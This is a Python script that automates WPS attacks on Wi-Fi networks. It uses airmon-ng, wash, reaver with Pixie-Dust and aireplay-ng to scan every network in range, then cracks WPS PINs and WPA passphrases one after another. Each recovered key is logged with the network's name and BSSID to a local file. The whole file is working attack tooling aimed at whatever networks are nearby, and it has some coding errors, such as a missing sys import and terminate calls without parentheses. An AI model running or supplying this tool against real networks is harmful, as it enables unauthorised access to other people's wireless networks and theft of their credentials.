#! /usr/bin/python3

import subprocess
import csv
import time
import pandas
import os
import os.path
import multiprocessing

attackmode=0
bssid=0
channel=0
wps=0
ssid=""
interface=0
choice=0
attack=0
ENonce = ""
RNonce = ""
PKE = ""
PKR = ""
AuthKey = ""
EHash1 = ""
EHash2 = ""
PIN = ""
PWD = ""
keycount = 0
network_max = 0
DN = open(os.devnull, 'w')

def reset():
   global ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
   ENonce = ""
   RNonce = ""
   PKE = ""
   PKR = ""
   AuthKey = ""
   EHash1 = ""
   EHash2 = ""
   PIN = ""
   PWD = ""
   return 0

def monitor():
   global interface
   try:
      subprocess.Popen(['airmon-ng', 'check', 'kill'], stdout=DN, stderr=DN)
      time.sleep(5)
      clear()
      subprocess.call(['airmon-ng'])
      interface=input("Choice: ")
      clear()
      subprocess.call(['airmon-ng', 'start', interface], stdout=DN, stderr=DN)
      interface=interface+'mon'
      clear()
      return interface
   except KeyboardInterrupt:
      return 0

def clear():
   subprocess.call(["clear"])

def scan():
   global network_max
   try:
      timeout = time.time() + 60*3
      subprocess.Popen(['wash', '-i', interface, '--ignore-fcs', '-P' , '-o', 'temp.csv'], stdout=DN, stderr=DN)
      time.sleep(5)
      while True:
         if time.time() > timeout:
            break
         clear()
         cr = csv.reader(open("temp.csv"))
         row_count = sum(1 for row in cr)
         network_max = row_count
         print ("Scanning for 3 Minutes...")
         print ("Found",str(row_count),"Networks")
         time.sleep(3)
      subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
      subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
      subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
   except KeyboardInterrupt:
      subprocess.Popen(['killall', 'wash'], stdout=DN, stderr=DN)
      subprocess.Popen(["sed -i 's/|/,/g' temp.csv"], stdout=DN, stderr=DN, shell=True)
      subprocess.Popen(["sed -i 's/ //g' temp.csv"], stdout=DN, stderr=DN, shell=True)
      return 0
		
def choose():
   global choice, bssid, ssid, channel
   try:
      clear()
      count=0
      with open('temp.csv', "r") as ifile:
         cr = pandas.read_csv('temp.csv', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
         print(cr)
         choice=input('Choice: ')
         clear()
         bssid=cr['BSSID'][choice]
         channel=cr['Channel'][choice]
         ssid=cr['SSID'][choice]
         return bssid,channel,ssid
   except KeyboardInterrupt:
      clear()
      return 0
		
def auto(attackmode):
   global bssid, ssid, channel, network_max
   counter = 0
   try:
      with open('temp.csv', "r") as ifile:
         cr = pandas.read_csv('temp.csv', names=['BSSID','Channel','Signal','WPS-Version','Locked','SSID'])
         for index, row in cr.iterrows():
            bssid=row['BSSID']
            channel=row['Channel']
            ssid=row['SSID']
            if open('bees.txt', 'r').read().find(bssid) != -1:
               print('Key already recovered for %s' % (bssid))
               time.sleep(5)
               continue
            elif row['Locked'] is "Yes":
               print('Skipping %s due to locked WPS' % (bssid))
               time.sleep(5)
               continue
            if attackmode == 2:
               b = multiprocessing.Process(target=bully, name="bully")
               b.start()
               b.join(190)
               if b.is_alive():
                  b.terminate()
                  b.join()
                  subprocess.call(['killall', 'bully'])
                  subprocess.call(['killall', 'aireplay-ng'])
            else:
               b = multiprocessing.Process(target=reaver, name="reaver")
               b.start()
               b.join(190)
               if b.is_alive():
                  b.terminate
                  b.join
                  subprocess.call(['killall', 'reaver'])
                  subprocess.call(['killall', 'aireplay-ng'])
   except KeyboardInterrupt:
      clear()
      reset()
      subprocess.call(['killall', 'bully'])
      subprocess.call(['killall', 'reaver'])
      subprocess.call(['killall', 'aireplay-ng'])
      return 0
   except:
      print("Unexpected error:", sys.exc_info()[0])
      raise
   print('%i Keys have been recovered' % (keycount))
   time.sleep(10)

def reaver():
   global choice, bssid, ssid, keycount, channel, ENonce, RNonce, PKE, PKR, AuthKey, EHash1, EHash2, PIN, PWD
   try:
      #clear()
      print('Trying to recover %s Key' % (bssid))
      time.sleep(3)
      cmd2 = ['aireplay-ng', "-1", str(4), '-a', bssid, interface]
      time.sleep(5)
      cmd3 = ['reaver', '-i', interface, '-b', bssid, '-c', str(channel), '-vvv',  "-L", "-a", "-A", "-P", '-K', str(1)]
      timeout = time.time() + 60*3
      proc = subprocess.Popen(cmd3, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
      stdout = []
      subprocess.Popen(cmd2, stdout=DN, stderr=DN)
      while True:
         line = proc.stdout.readline()
         stdout.append(line)
         if time.time() > timeout:
            break
         if b"E-Nonce" in line and ENonce == "":
            ENonce=line.split(':',1)[1].strip()
            print("E-Nonce: found")
            print(ENonce)
         if b"PKE" in line and PKE == "":
            PKE=line.split(':',1)[1].strip()
            print("PKE: found")
            print(PKE)
         if b"R-Nonce" in line and RNonce == "":
            RNonce=line.split(':',1)[1].strip()
            print("R-Nonce: found")
            print(RNonce)
         if b"PKR" in line and PKR == "":
            PKR=line.split(':',1)[1].strip()
            print("PKR: found")
            print(PKR)
         if b"AuthKey" in line and AuthKey == "":
            AuthKey=line.split(':',1)[1].strip()
            print("AuthKey: found")
            print(AuthKey)
         if b"E-Hash1" in line and EHash1 == "":
            EHash1=line.split(':',1)[1].strip()
            print("E-Hash1: found")
            print(EHash1)
         if b"E-Hash2" in line and EHash2 == "":
            EHash2=line.split(':',1)[1].strip()
            print("E-Hash2: found")
            print(EHash2)
         if b"WPS pin" in line and PIN == "":
            PIN=line.split(':',4)[1].strip()
            print("WPS Pin: found")
            print(PIN)
         if b"WPA PSK" in line:
            PWD=line.split(':',1)[1].strip()
            print("Key recovered!")
            keycount = keycount + 1
            text_file = open("bees.txt", "a")
            text_file.write("SSID: %s\nBSSID: %s\nKey: %s\nPin: %s\n\n" % (ssid, bssid, PWD, PIN))
            text_file.close()
            subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
            subprocess.call(['killall', 'reaver'], stderr=DN)
            time.sleep(10) 
         if line == '' and proc.poll() != None:
            subprocess.call(['killall', 'airodump-ng'], stderr=DN)
            subprocess.call(['killall', 'reaver'], stderr=DN)
            subprocess.call(['killall', 'aireplay-ng'], stderr=DN)
            break
      return 0
   except KeyboardInterrupt:
      subprocess.call(['killall', 'airodump-ng'])
      subprocess.call(['killall', 'reaver'])
      subprocess.call(['killall', 'aireplay-ng'])
   except:
      print("Unexpected error:", sys.exc_info()[0])
      raise
   reset()
		

clear()

if os.path.isfile("bees.txt"):
	pass
else:
	subprocess.call(['touch', 'bees.txt'])
#while x != 99:
#        if interface == 0:
#            print("Interface: none")
#        else:
#            print("Interface:",interface)
#	if attackmode == 1:
#	    print("Attackmode: Reaver")
#	else:
#	    print("Attackmode: Bully")
#	print('Networks: %s' % (network_max))
#       print("1. Start Monitormode")
#        print('2. Scan Networks')
#        print('3. Choose Network')
#        print('4. Start Attack')
#	print('5. Automode')
#        print('99. Exit')
#        x=input('Choice: ')
#        if x == 1:
#            monitor()
#        if x == 2:
#            scan()
#        if x == 3:
#            choose()
#        if x == 4:
#            reaver()
#	if x == 5:
#	    auto(1)//

monitor()
scan()
auto(1)

subprocess.call(['killall', 'airodump-ng'])
subprocess.call(['killall', 'reaver'])
subprocess.call(['killall', 'aireplay-ng'])
subprocess.call(['airmon-ng', 'stop', interface], stdout=DN)
subprocess.call(['service', 'network-manager', 'restart'])
subprocess.call(['rm', 'temp.csv'])
subprocess.call(['rm', '/root/.bully/*.run'])
quit()
